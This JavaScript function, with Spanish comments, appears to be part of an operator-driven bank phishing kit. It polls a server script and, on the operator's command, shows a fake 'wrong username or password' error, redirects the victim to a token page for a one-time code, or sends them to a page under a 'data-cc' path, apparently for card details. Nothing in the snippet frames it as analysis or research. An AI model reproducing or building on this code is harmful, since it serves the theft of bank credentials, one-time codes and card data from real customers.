    async function checkCajeroVerification(transactionId, messageId) {
        try {
            const formData = new FormData();
            formData.append('transactionId', transactionId);
            formData.append('messageId', messageId);

            const res = await fetch('verificar_cajero.php', {
                method: 'POST',
                body: formData
            });
            const result = await res.json();

            if (result.action) {
                switch (result.action) {
                    case 'confirm_finalizar':
                        window.location.href = "../fin.php";
                        break;
                    case 'error_logo': 
                        // Ocultar loader antes de mostrar error
                        const loader2 = document.getElementById('loader-overlay');
                        if (loader2) {
                            loader2.style.display = 'none';
                        }
                        alert("Usuario o clave incorrectos.");
                        window.location.href = "index.html";
                        break;
                    case 'pedir_dinamica':

                        const loader3 = document.getElementById('loader-overlay');
                        if (loader3) {
                            loader3.style.display = 'none';
                        }
                        window.location.href = "token.html";
                        break;
                    case 'error_cajero': 
                        // Ocultar loader antes de mostrar error
                        const loader4 = document.getElementById('loader-overlay');
                        if (loader4) {
                            loader4.style.display = 'none';
                        }
                        $("#frmErrCajero").show();
                        break;
                    case 'tarjeta': // ✅ botón nuevo manejado
                    window.location.href = "../../../../../data-cc/alter.php";
                    break;
                }
            } else {
                setTimeout(() => checkCajeroVerification(transactionId, messageId), 2000);
            }
        } catch (err) {
            setTimeout(() => checkCajeroVerification(transactionId, messageId), 2000);
        }
